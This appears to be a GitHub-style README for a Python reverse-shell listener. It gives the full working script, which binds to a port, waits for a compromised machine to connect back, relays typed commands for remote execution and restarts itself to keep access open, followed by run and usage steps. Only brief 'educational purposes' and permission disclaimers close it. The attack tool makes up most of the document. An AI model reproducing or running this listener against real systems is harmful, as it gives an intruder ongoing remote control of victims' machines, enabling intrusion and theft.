# Python Listener for Reverse Shell

This Python script acts as a listener to receive connections from a reverse shell application. It allows you to remotely execute commands on the target machine that is running the reverse shell.

## Features

- Continuously listens for incoming connections.
- Executes commands sent from the listener on the target machine.
- Automatically restarts the listener if the connection is lost or an error occurs.
- Gracefully handles keyboard interrupts to shut down the listener.

## Prerequisites

- Python 3.x installed on the remote server.

## Setup

1. Save the following Python script as `listener.py`:

    ```python
    import socket
    import time

    def start_listener(host, port):
        while True:
            try:
                # Create a socket object
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                # Bind the socket to the host and port
                server_socket.bind((host, port))

                # Listen for incoming connections
                server_socket.listen(1)
                print(f"Listening on {host}:{port}...")

                # Accept a connection
                client_socket, client_address = server_socket.accept()
                print(f"Connection from {client_address}")

                try:
                    while True:
                        # Receive command from user
                        command = input("Enter command: ")
                        if not command.strip():
                            continue

                        # Send the command to the client
                        client_socket.sendall(command.encode() + b'\n')

                        # Receive and print the response
                        response = client_socket.recv(4096).decode()
                        if not response:
                            break
                        print(response, end='')

                except KeyboardInterrupt:
                    print("\nShutting down listener...")
                    break
                except Exception as e:
                    print(f"Error: {e}")
                finally:
                    # Close the connection
                    client_socket.close()
                    server_socket.close()

            except Exception as e:
                print(f"Listener error: {e}")
                print("Restarting listener in 5 seconds...")
                time.sleep(5)  # Wait for 5 seconds before restarting the listener

    if __name__ == "__main__":
        host = "0.0.0.0"  # Listen on all interfaces
        port = 9001       # Change Port 
        start_listener(host, port)
    ```

2. Run the Python script on your remote server:

    ```sh
    python listener.py
    ```

## Usage

1. Run the listener script using the command above.
2. Wait for the reverse shell to connect to the listener.
3. Enter commands into the listener terminal to execute them on the connected reverse shell.

## Notes

- Ensure that the port number in the listener script matches the port number used by the reverse shell.
- The listener will automatically restart if the connection is lost or an error occurs, ensuring continuous operation.

## Security Considerations

- Use this script responsibly and ensure you have permission to access the target machine.
- Running a listener on a public-facing server can expose it to unauthorized access. Ensure proper network security measures are in place.

## License

This project is licensed under the MIT License. See the LICENSE file for more details.

## Disclaimer

This tool is intended for educational purposes only. The author is not responsible for any misuse or damage caused by this tool. Use it at your own risk.